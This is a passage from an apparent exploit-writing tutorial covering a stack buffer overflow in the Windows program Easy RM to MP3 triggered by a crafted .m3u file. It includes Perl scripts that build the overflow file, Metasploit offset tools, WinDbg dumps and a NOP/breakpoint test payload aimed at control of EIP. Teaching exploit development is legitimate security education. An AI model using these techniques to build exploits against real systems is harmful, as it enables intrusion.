<p>That means… If the data in [Buffer] is somewhat longer than 0x98 bytes, the strcpy() will overwrite saved EBP and eventually saved EIP (and so on). After all, it just continues to read &amp; write until it reaches a null byte in the source location (in case of a string)</p>
<p><a href="/wp-content/uploads/2010/09/image25.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb25.png" alt="image" width="368" height="323" border="0"></a></p>
<p>ESP still points at the begin of the string.&nbsp; The strcpy() completes as if nothing is wrong.&nbsp; After the strcpy(), the function ends. And this is where things get interesting.&nbsp; The function epilog kicks in.&nbsp; Basically, it will move ESP back to the location where saved EIP was stored, and it will issue a RET.&nbsp; It will take the pointer (AAAA or 0x41414141 in our case, since it got overwritten), and will jump to that address.</p>
<p>So you control EIP.</p>
<p>Long story short, by controlling EIP, you basically change the return address that the function will uses in order to “resume normal flow”.</p>
<p>Of course, if you change this return address by issuing a buffer overflow, it’s not a “normal flow” anymore.</p>
<p>So… Suppose you can overwrite the buffer in MyVar, EBP, EIP and you have A’s (your own code) in the area before and after saved EIP… think about it.&nbsp; After sending the buffer ([MyVar][EBP][EIP][your code]), ESP will/should point at the beginning of [your code]. So if you can make EIP go to your code, you’re in control.</p>
<blockquote><p>Note : when a buffer on the stack overflows, the term “stack based overflow” or “<a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>stack buffer overflow</a>” is used. When you are trying to write past the end of the stack frame, the term “<a href="http://en.wikipedia.org/wiki/Stack_overflow" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>stack overflow</a>” is used. Don’t mix those two up, as they are entirely different.</p></blockquote>
<h3>The debugger</h3>
<p>In order to see the state of the stack (and value of registers such as the instruction pointer, stack pointer etc), we need to hook up a debugger to the application, so we can see what happens at the time the application runs (and especially when it dies).</p>
<p>There are many debuggers available for this purpose. The two debuggers I use most often are Windbg, <a href="http://www.ollydbg.de/" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>and</a> Immunity’s Debugger</p>
<p>Let’s use Windbg.&nbsp; Install Windbg (Full install) and register it as a “post-mortem” debugger using&nbsp; “windbg -I”.</p>
<p><a href="/wp-content/uploads/2009/07/image5.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb5.png" alt="image" width="368" height="69" border="0"></a></p>
<p><a href="/wp-content/uploads/2009/07/image6.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb6.png" alt="image" width="392" height="172" border="0"></a></p>
<p>You can also disable the “xxxx has encountered a problem and needs to close” popup by setting the following registry key :</p>
<p>HKLM\Software\Microsoft\Windows NT\CurrentVersion\AeDebug\Auto : set to 0</p>
<p><a href="/wp-content/uploads/2009/07/image7.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb7.png" alt="image" width="357" height="135" border="0"></a></p>
<p>In order to avoid Windbg complaining about Symbol files not found, create a folder on your harddrive (let’s say c:\windbgsymbols). Then, in Windbg, go to “File” – “Symbol File Path” and enter the following string :</p>
<blockquote><p>SRV*C:\windbgsymbols*http://msdl.microsoft.com/download/symbols</p></blockquote>
<p><strong>(do NOT put an empty line after this string ! make sure this string is the only string in the symbol path field)</strong></p>
<p>If you want to use Immunity Debugger instead : get a copy here and install it.&nbsp; Open Immunity debugger, go to “Options” – “Just in-time debugging” and click “Make Immunity Debugger just in-time debugger”.</p>
<p>&nbsp;</p>
<p>Ok, let’s get started.</p>
<p>Launch Easy RM to MP3, and then open the crash.m3u file again.&nbsp; The application will crash again. If you have disabled the popups, windbg or Immunity debugger will kick in automatically. If you get a popup, click the “debug” button and the debugger will be launched :</p>
<p>Windbg :</p>
<p><a href="/wp-content/uploads/2009/07/image50.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image50_thumb.png" alt="image" width="387" height="409" border="0"></a></p>
<p>Immunity :</p>
<p><a href="/wp-content/uploads/2010/08/image11.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/08/image_thumb11.png" alt="image" width="551" height="419" border="0"></a></p>
<p>This GUI shows the same information, but in a more…errr.. graphical way.&nbsp; In the upper left corner, you have the CPU view, which shows assembly instructions and their opcodes.&nbsp; (the window is empty because EIP currently points at 41414141 and that’s not a valid address).&nbsp; In the upper right windows, you can see the registers.&nbsp; In the lower left corner, you see the memory dump of 00446000 in this case. In the lower right corner, you can see the contents of the stack (so the contents of memory at the location where ESP points at).</p>
<p>Anyways, in both cases, we can see that the instruction pointer contains 41414141, which is the hexidecimal representation for AAAA.</p>
<blockquote><p>A quick note before proceeding : On intel x86, the addresses are stored little-endian (so backwards).&nbsp; The AAAA you are seeing is in fact AAAA :-)&nbsp; (or, if you have sent ABCD in your buffer, EIP would point at 44434241 (DCBA)</p></blockquote>
<p>So it looks like part of our m3u file was read into the buffer and caused the buffer to overflow.&nbsp; We have been able to overflow the buffer and write across the instruction pointer.&nbsp;&nbsp; So we may be able to control the value of EIP.</p>
<p>Since our file does only contain A’s, we don’t know exactly how big our buffer needs to be in order to write exactly into EIP. In other words, if we want to be specific in overwriting EIP (so we can feed it usable data and make it jump to our evil code, we need to know the exact position in our buffer/payload where we overwrite the return address (which will become EIP when the function returns).&nbsp; This position is often referred to as the “offset”.</p>
<p>&nbsp;</p>
<h3>Determining the buffer size to write exactly into EIP</h3>
<p>We know that EIP is located somewhere between 20000 and 30000 bytes from the beginning of the buffer. Now, you could potentially overwrite all memory space between 20000 and 30000 bytes with the address you want to overwrite EIP with. This may work, but it looks much more nice if you can find the exact location to perform the overwrite. In order to determine the exact offset of EIP in our buffer, we need to do some additional work.</p>
<p>First, let’s try to narrow down the location by changing our perl script just a little :</p>
<p>Let’s cut things in half.&nbsp; We’ll create a file that contains 25000 A’s and another 5000 B’s.&nbsp; If EIP contains an 41414141 (AAAA), EIP sits between 20000 and 25000, and if EIP contains 42424242 (BBBB), EIP sits between 25000 and 30000.</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">my $file= <span style="color: #006080;">"crash25000.m3u"</span>;
my $junk = <span style="color: #006080;">"\x41"</span> x 25000;
my $junk2 = <span style="color: #006080;">"\x42"</span> x 5000;
open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$junk2;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<p>Create the file and open crash25000.m3u in Easy RM to MP3.</p>
<p><a href="/wp-content/uploads/2009/07/image58.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image58_thumb.png" alt="image" width="570" height="124" border="0"></a></p>
<p>OK, so eip contains 42424242 (BBBB), so we know EIP has an offset between 25000 and 30000. That also means that we should/may see the remaining B’s in memory where ESP points at (given that EIP was overwritten before the end of the 30000 character buffer)</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">Buffer :
                       [&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5000 B<span style="color: #006080;">'s                   ]
[AAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB][BBBB][BBBBBBBBB......]
     25000 A'</span>s                        EIP  ESP points here</pre>
</div>
<p>dump the contents of ESP :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">0:000&gt; d esp
000ff730  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff740  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff750  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff760  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff770  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff780  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff790  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff7a0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0:000&gt; d
000ff7b0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff7c0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff7d0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff7e0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff7f0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff800  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff810  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff820  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0:000&gt; d
000ff830  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff840  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff850  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff860  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff870  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff880  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff890  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
000ff8a0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</pre>
</div>
<p>That is great news. We have overwritten EIP with BBBB and we can also see our buffer in ESP.</p>
<p>Before we can start tweaking the script, we need to find the exact location in our buffer that overwrites EIP.</p>
<p>In order to find the exact location, we’ll use Metasploit.</p>
<p>Metasploit has a nice tool to assist us with calculating the offset. It will generate a string that contains unique patterns. Using this pattern (and the value of EIP after using the pattern in our malicious .m3u file), we can see how big the buffer should be to write exactly into EIP.</p>
<p>Open the tools folder in the metasploit framework3 folder (I’m using a linux version of metasploit 3). You should find a tool called pattern_create.rb. Create a pattern of 5000 characters and write it into a file</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">root@bt:/pentest/exploits/framework3/tools# <strong>./pattern_create.rb</strong>
Usage: pattern_create.rb length [set a] [set b] [set c]
root@bt:/pentest/exploits/framework3/tools# <strong>./pattern_create.rb 5000 </strong></pre>
</div>
<p>Edit the perl script and replace the content of $junk2 with our 5000 characters.</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">my $file= <span style="color: #006080;">"crash25000.m3u"</span>;
my $junk = <span style="color: #006080;">"\x41"</span> x 25000;
my $junk2 = “put the 5000 characters here”
open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$junk2;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<p>Create the m3u file.&nbsp; open this file in Easy RM to MP3, wait until the application dies again, and take note of the contents of EIP</p>
<p><a href="/wp-content/uploads/2009/08/image3.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/08/image_thumb3.png" alt="image" width="677" height="154" border="0"></a></p>
<p>At this time, eip contains 0x356b4234 (note : little endian : we have overwritten EIP with 34 42 6b 35 = 4Bk5</p>
<p>Let’s use a second metasploit tool now, to calculate the exact length of the buffer before writing into EIP, feed it with the value of EIP (based on the pattern file) and length of the buffer :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">root@bt:/pentest/exploits/framework3/tools# ./pattern_offset.rb 0x356b4234 5000
1094
root@bt:/pentest/exploits/framework3/tools#</pre>
</div>
<p>1094. That’s the buffer length needed to overwrite EIP. So if you create a file with 25000+1094 A’s, and then add 4 B’s (42 42 42 42 in hex) EIP should contain 42 42 42 42.&nbsp; We also know that ESP points at data from our buffer, so we’ll add some C’s after overwriting EIP.</p>
<p>Let’s try. Modify the perl script to create the new m3u file.</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">my $file= <span style="color: #006080;">"eipcrash.m3u"</span>;
my $junk= <span style="color: #006080;">"A"</span> x 26094;
my $eip = <span style="color: #006080;">"BBBB"</span>;
my $espdata = <span style="color: #006080;">"C"</span> x 1000;
open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$eip.$espdata;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<p>Create eipcrash.m3u, open it in Easy RM to MP3, observe the crash and look at eip and the contents of the memory at ESP:</p>
<p><a href="/wp-content/uploads/2009/07/image70.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image70_thumb.png" alt="image" width="655" height="128" border="0"></a></p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">0:000&gt; d esp
000ff730  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ff740  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ff750  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ff760  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ff770  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ff780  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ff790  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ff7a0  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</pre>
</div>
<p>In Immunity Debugger, you can see the contents of the stack, at ESP, by looking at the lower right hand window.</p>
<p>Excellent. EIP contains BBBB, which is exactly what we wanted. So now we control EIP. On top of that, ESP points to our buffer (C’s)</p>
<blockquote><p>Note : the offset shown here is the result of the analysis on my own system.&nbsp; If you are trying to reproduce the exercises from this tutorial on your own system, odds are high that you will get a different offset address. So please don’t just take the offset value or copy the source code to your system, as the offset is based on the file path where the m3u file is stored.&nbsp; The buffer that is vulnerable to an overflow includes the full path to the m3u file. So if the path on your system is shorter or larger than mine, then the offset will be different.</p></blockquote>
<p>Our exploit buffer so far looks like this :</p>
<table border="1" width="665" cellspacing="0" cellpadding="1">
<tbody>
<tr>
<td valign="top" width="130">Buffer</td>
<td valign="top" width="95">EBP</td>
<td valign="top" width="88">EIP</td>
<td valign="top" width="350">ESP points here&nbsp;<p></p>
<p>|</p>
<p>V</p></td>
</tr>
<tr>
<td valign="top" width="130">A (x 26090)</td>
<td valign="top" width="95">AAAA</td>
<td valign="top" width="88">BBBB</td>
<td valign="top" width="350">CCCCCCCCCCCCCCCCCCCCCCCC</td>
</tr>
<tr>
<td valign="top" width="130">414141414141…41</td>
<td valign="top" width="99">41414141</td>
<td valign="top" width="95">42424242</td>
<td valign="top" width="350">&nbsp;</td>
</tr>
<tr>
<td valign="top" width="130">26090 bytes</td>
<td valign="top" width="99">4 bytes</td>
<td valign="top" width="95">4 bytes</td>
<td valign="top" width="350">1000 bytes ?</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h3>Find memory space to host the shellcode</h3>
<p>We control EIP. So we can point EIP to somewhere else, to a place that contains our own code (shellcode).&nbsp; But where is this space, how can we put our shellcode in that location and how can we make EIP jump to that location ?</p>
<p>In order to crash the application, we have written 26094 A’s into memory, we have written a new value into the saved EIP field (ret), and we have written a bunch of C’s.</p>
<p>When the application crashes, take a look at the registers and dump all of them&nbsp; (d esp, d eax, d ebx, d ebp, …).&nbsp; If you can see your buffer (either the A’s or the C’s) in one of the registers, then you may be able to replace those with shellcode and jump to that location.&nbsp;&nbsp; In our example, We can see that ESP seems to point to our C’s (remember the output of d esp above), so ideally we would put our shellcode instead of the C’s and we tell EIP to go to the ESP address.</p>
<p>Despite the fact that we can see the C’s, we don’t know for sure that the first C (at address 000ff730, where ESP points at), is in fact the first C that we have put in our buffer.</p>
<p>We’ll change the perl script and feed a pattern of characters (I’ve taken 144 characters, but you could have taken more or taken less) instead of C’s :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">my $file= <span style="color: #006080;">"test1.m3u"</span>;
my $junk= <span style="color: #006080;">"A"</span> x 26094;
my $eip = <span style="color: #006080;">"BBBB"</span>;
my $shellcode = <span style="color: #006080;">"1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK"</span> .
<span style="color: #006080;">"5ABCDEFGHIJK6ABCDEFGHIJK"</span> .
<span style="color: #006080;">"7ABCDEFGHIJK8ABCDEFGHIJK"</span> .
<span style="color: #006080;">"9ABCDEFGHIJKAABCDEFGHIJK"</span>.
<span style="color: #006080;">"BABCDEFGHIJKCABCDEFGHIJK"</span>;
open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$eip.$shellcode;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<p>Create the file, open it, let the application die and dump memory at location ESP :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">0:000&gt; d esp
000ff730  44 45 46 47 48 49 4a 4b-32 41 42 43 44 45 46 47  DEFGHIJK2ABCDEFG
000ff740  48 49 4a 4b 33 41 42 43-44 45 46 47 48 49 4a 4b  HIJK3ABCDEFGHIJK
000ff750  34 41 42 43 44 45 46 47-48 49 4a 4b 35 41 42 43  4ABCDEFGHIJK5ABC
000ff760  44 45 46 47 48 49 4a 4b-36 41 42 43 44 45 46 47  DEFGHIJK6ABCDEFG
000ff770  48 49 4a 4b 37 41 42 43-44 45 46 47 48 49 4a 4b  HIJK7ABCDEFGHIJK
000ff780  38 41 42 43 44 45 46 47-48 49 4a 4b 39 41 42 43  8ABCDEFGHIJK9ABC
000ff790  44 45 46 47 48 49 4a 4b-41 41 42 43 44 45 46 47  DEFGHIJKAABCDEFG
000ff7a0  48 49 4a 4b 42 41 42 43-44 45 46 47 48 49 4a 4b  HIJKBABCDEFGHIJK
0:000&gt; d
000ff7b0  43 41 42 43 44 45 46 47-48 49 4a 4b 00 41 41 41  CABCDEFGHIJK.AAA
000ff7c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff810  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff820  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</pre>
</div>
<p>ok, we can see 2 interesting things here :</p>
<ul>
<li>ESP starts at the 5th character of our pattern, and not the first character. (due to calling conventions, the child function will clean up stack space used by the parent function when it passed an argument to the child function)</li>
<li>After the pattern string, we see “A’s”.&nbsp; These A’s most likely belong to the first part of the buffer (26101 A’s), so we may also be able to put our shellcode in the first part of the buffer (before overwriting RET)…</li>
</ul>
<p>But let’s not go that way yet.&nbsp; We’ll first add 4 characters in front of the pattern and do the test again.&nbsp; If all goes well, ESP should now point directly at the beginning of our pattern :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">my $file= <span style="color: #006080;">"test1.m3u"</span>;
my $junk= <span style="color: #006080;">"A"</span> x 26094;
my $eip = <span style="color: #006080;">"BBBB"</span>;
my $preshellcode = <span style="color: #006080;">"XXXX"</span>;
my $shellcode = <span style="color: #006080;">"1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK"</span> .
<span style="color: #006080;">"5ABCDEFGHIJK6ABCDEFGHIJK"</span> .
<span style="color: #006080;">"7ABCDEFGHIJK8ABCDEFGHIJK"</span> .
<span style="color: #006080;">"9ABCDEFGHIJKAABCDEFGHIJK"</span>.
<span style="color: #006080;">"BABCDEFGHIJKCABCDEFGHIJK"</span>;
open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$eip.$preshellcode.$shellcode;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>Let the application crash and look at esp again</div>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">0:000&gt; d esp
000ff730  31 41 42 43 44 45 46 47-48 49 4a 4b 32 41 42 43  1ABCDEFGHIJK2ABC
000ff740  44 45 46 47 48 49 4a 4b-33 41 42 43 44 45 46 47  DEFGHIJK3ABCDEFG
000ff750  48 49 4a 4b 34 41 42 43-44 45 46 47 48 49 4a 4b  HIJK4ABCDEFGHIJK
000ff760  35 41 42 43 44 45 46 47-48 49 4a 4b 36 41 42 43  5ABCDEFGHIJK6ABC
000ff770  44 45 46 47 48 49 4a 4b-37 41 42 43 44 45 46 47  DEFGHIJK7ABCDEFG
000ff780  48 49 4a 4b 38 41 42 43-44 45 46 47 48 49 4a 4b  HIJK8ABCDEFGHIJK
000ff790  39 41 42 43 44 45 46 47-48 49 4a 4b 41 41 42 43  9ABCDEFGHIJKAABC
000ff7a0  44 45 46 47 48 49 4a 4b-42 41 42 43 44 45 46 47  DEFGHIJKBABCDEFG
0:000&gt; d
000ff7b0  48 49 4a 4b 43 41 42 43-44 45 46 47 48 49 4a 4b  HIJKCABCDEFGHIJK
000ff7c0  00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA
000ff7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff810  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff820  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</pre>
</div>
<p>Much better !</p>
<p>We now have</p>
<ul>
<li>control over EIP</li>
<li>an area where we can write our code (at least 144 bytes large.&nbsp; If you do some more tests with longer patterns, you will see that you have even more space… plenty of space in fact)</li>
<li>a register that directly points at our code, at address 0x000ff730</li>
</ul>
<div>Now we need to</div>
<ul>
<li>build real shellcode</li>
<li>tell EIP to jump to the address of the start of the shellcode.&nbsp; We can do this by overwriting EIP with 0x000ff730.</li>
</ul>
<p>Let’s see</p>
<p>We’ll build a small test case : first 26094 A’s, then overwrite EIP with 000ff730, then put 25 NOP’s, then a break, and then more NOP’s.</p>
<p>If all goes well, EIP should jump 000ff730, which contains NOPs. The code should slide until the break.</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">my $file= <span style="color: #006080;">"test1.m3u"</span>;
my $junk= <span style="color: #006080;">"A"</span> x 26094;
my $eip = pack(<span style="color: #006080;">'V'</span>,0x000ff730);  

my $shellcode = <span style="color: #006080;">"\x90"</span> x 25; 

$shellcode = $shellcode.<span style="color: #006080;">"\xcc"</span>;
$shellcode = $shellcode.<span style="color: #006080;">"\x90"</span> x 25; 

open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$eip.$shellcode;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>The application died, but we expected a break instead of an access violation.</div>
<div>When we look at EIP, it points to 000ff730, and so does ESP.</div>
<div>When we dump ESP, we don’t see what we had expected.</div>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=0000662c
eip=000ff730 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span style="color: #5576D1;">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1;">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1;">out</span> or corrupt data.
<unloaded_p32.dll>+0xff71f:
000ff730 0000            add     <span style="color: #5576D1;">byte</span> ptr [eax],al          ds:0023:00000001=??
0:000&gt; d esp
000ff730  00 00 00 00 06 00 00 00-58 4a 10 00 01 00 00 00  ........XJ......
000ff740  30 f7 0f 00 00 00 00 00-41 41 41 41 41 41 41 41  0.......AAAAAAAA
000ff750  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff760  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff770  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff780  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff790  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</unloaded_p32.dll></pre>
</div>
<div>So jumping directly to a memory address may not be a good solution after all. (000ff730 contains a null byte, which is a string terminator… so the A’s you are seeing are coming from the first part of the buffer… We never reached the point where we started writing our data after overwrite EIP…</div>
<div>Besides, using a memory address to jump to in an exploit would make the exploit very unreliable. After all, this memory address could be different in other OS versions, languages, etc…)</div>
<div>Long story short : we cannot just overwrite EIP with a direct memory address such as 000ff730. It’s not a good idea because it would not be reliable, and it’s not a good idea because it contains a null byte.&nbsp; We have to use another technique to achieve the same goal : make the application jump to our own provided code. Ideally, we should be able to reference a register (or an offset to a register), ESP in our case, and find a function that will jump to that register.&nbsp; Then we will try to overwrite EIP with the address of that function and it should be time for pancakes and icecream.</div>
<div>&nbsp;</div>
